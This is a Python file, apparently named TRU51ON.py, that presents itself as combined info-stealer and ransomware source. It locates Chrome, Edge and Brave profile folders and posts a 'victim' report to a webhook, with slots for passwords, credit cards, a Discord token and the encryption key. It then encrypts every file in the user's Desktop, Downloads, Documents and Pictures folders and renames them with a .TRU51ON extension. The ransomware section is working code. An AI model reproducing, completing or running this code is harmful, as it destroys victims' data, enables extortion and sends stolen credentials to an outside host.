# Import modules
import os
import requests
import json
from cryptography.fernet import Fernet

# Settings
webhook = ''

# Generate the decryption key and save it to antidote.key
key = Fernet.generate_key()

## Info stealer ##
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
            'chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
        }

        self.profiles = (
            'Default',
            'Profile 1',
            'Profile 2'
        )

    def iterate_items(self): 
        for _, path in self.browsers.items():
            if os.path.exists(path):
                yield path

data = {
    "username" : "Karin van de administratie"
}

data["embeds"] = []

data["embeds"].append({
    "title" : "TRU51ON victim: ",
    "color": "14177041"
})

# Adding fields
fields = [
    {
        "name": ":pushpin: Country",
        "value": "Hi, from <flag>"
    },
    {
        "name": ":old_man: **About me**",
        "value": f"```Country: ...\nDisplay name: ... \nUsername: ...```",
    },
    {
        "name": ":lock: **Ransomware**",
        "value": f"```Decryption key:\n{key}```",
    },
    {
        "name": ":globe_with_meridians: **Browser foundings**",
        "value": f"```Usernames and passwords:\n...\n\nCredit Cards:\n...```",
    },
    {
        "name": ":robot: Botnet attendant token:",
        "value": f"```Discord token: ...```",
    }
]

data["embeds"][0]["fields"] = fields

# Send the data to the webhook
result = requests.post(webhook, json=data)
try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print("Payload delivered successfully, code {}.".format(result.status_code))


## Ransomware ##
# Get the paths for Desktop, Downloads, Documents and Pictures
userprofile = os.environ.get("USERPROFILE")
desktop = os.path.join(userprofile, "Desktop")
downloads = os.path.join(userprofile, "Downloads")
documents = os.path.join(userprofile, "Documents")
pictures = os.path.join(userprofile, "Pictures")

# List of directories to search
directories = [desktop, downloads, documents, pictures]

# List all files in the current directory except for TRU51ON.py and antidote.key
files = []
for directory in directories:
    for file in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, file)):
            if file == "TRU51ON.py" or file == 'antidote.key':
                continue
            else:
                files.append(os.path.join(directory, file))

# Encrypt the files one by one
for file in files:
    try:
        with open(file, 'rb') as f:
            content = f.read()
        content_encrypted = Fernet(key).encrypt(content)
        with open(file, 'wb') as f:
            f.write(content_encrypted)
        os.rename(file, file + '.TRU51ON')
    except:
        pass